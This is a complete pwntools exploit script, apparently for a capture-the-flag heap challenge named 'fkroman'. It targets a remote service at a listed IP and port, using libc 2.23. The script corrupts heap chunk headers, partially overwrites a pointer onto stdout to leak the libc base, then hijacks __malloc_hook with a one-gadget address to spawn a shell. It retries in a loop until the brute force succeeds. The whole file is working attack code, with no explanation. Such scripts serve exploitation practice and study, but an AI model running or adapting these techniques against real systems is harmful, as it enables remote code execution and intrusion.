#coding=utf-8
from pwn import *
local = 1
exec_file="./fkroman"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *
    '''
    gdb.attach(a,script)

def menu(idx,b):
    a.sendlineafter("Your choice: ",str(idx))
    a.sendlineafter(": ",str(b))
def add(idx,size):
    menu(1,idx)
    a.sendlineafter("Size: ",str(size))

def delete(idx):
    menu(3,idx)
def edit(idx,size,content):
    menu(4,idx)
    a.sendlineafter("Size: ",str(size))
    a.sendafter("Content: ",content)
while 1:
    try :
        a=remote("121.40.246.48",9999)
        libc=ELF("./libc-2.23.so")
        add(0,0x18)#0
        add(1,0x68)#1
        add(2,0x68)#2
        add(3,0x18)#3
        edit(2,81,p64(0x21)*10+'\n')
        delete(1)
        payload='A'*0x18+p64(0x91)+'\n'
        edit(0,len(payload),payload)
        delete(1)
        #debug()
        #debug()
        payload='A'*0x18+p64(0x71)+'\xdd\x55'
        edit(0,len(payload),payload)
        #debug()
        add(4,0x68)#4
        add(5,0x68)#5
        payload='\x00'*0x33+p64(0x00000000fbad1800)+p64(0)*3+'\x00'
        #debug()
        edit(5,len(payload),payload)
        a.recvuntil(p64(0x00000000fbad1800))
        a.recvuntil("\x7f")
        libc_base=u64(a.recvuntil("\x7f")[-6:]+'\x00\x00')-libc.symbols["_IO_2_1_stdout_"]-131
        success("libc_base ==> 0x%x"%libc_base)
        payload='\x00'*0x33+p64(0x00000000fbad2887)
        edit(5,len(payload),payload)
        #debug()
        delete(4)
        edit(4,8,p64(libc_base+libc.symbols["__malloc_hook"]-0x23))
        add(7,0x68)
        add(8,0x68)
        payload='\x00'*0x13+p64(libc_base+0x4526a)
        edit(8,len(payload),payload)
        add(10,'10')
        a.interactive()
    except:
        a.close()
        continue








